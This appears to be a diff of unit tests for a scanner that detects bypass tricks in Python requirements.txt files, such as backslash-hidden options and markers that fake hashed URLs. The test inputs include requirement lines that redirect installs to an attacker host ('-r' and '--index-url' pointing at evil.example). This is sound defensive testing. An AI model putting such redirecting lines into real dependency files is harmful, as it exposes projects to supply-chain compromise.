@@ -113,7 +113,10 @@ class RequirementBypasses(unittest.TestCase):
 
     def test_a_leading_backslash_on_a_continued_line_does_not_hide_an_option(self):
         self.flags({"requirements.txt": "\\-r https://evil.example/r.txt#sha256=ab \\\n\nrequests==2.31.0\n"})
-        self.flags({"requirements.txt": "\\--index-url https://evil.example/simple/#sha256=ab \\\n\nrequests==2.31.0\n"})
+        # A replacement source is allowed (the owner's choice) but must be
+        # read as one and listed, not hidden as a "hashed URL".
+        findings, notes = requirements({"requirements.txt": "\\--index-url https://evil.example/simple/#sha256=ab \\\n\nrequests==2.31.0\n"})
+        self.assertIn("https://evil.example/simple/#sha256=ab", " ".join(notes))
 
     def test_a_marker_cannot_make_a_loose_pin_look_like_a_hashed_url(self):
         self.flags({"requirements.txt": 'requests>=0; sys_platform != "://#sha256=0"\n'})
@@ -146,7 +149,7 @@ class RequirementFalseAlarms(unittest.TestCase):
         self.clean({"requirements.txt": "\ufefffastapi==0.165.0\n"})
 
     def test_options_after_a_requirement_are_read_as_options(self):
-        self.clean({"requirements.txt": f"lib==1.0\t--hash={DIGEST}\nother==2.0 --config-settings=foo=bar\n"})
+        self.clean({"requirements.txt": f"lib==1.0 --hash={DIGEST}\nother==2.0 --config-settings=foo=bar\n"})
 
     def test_installing_the_project_itself_or_a_local_wheel_passes(self):
         self.clean({"requirements.txt": ".\n./packages/core\n./wheels/lib-1.0-py3-none-any.whl\n"})
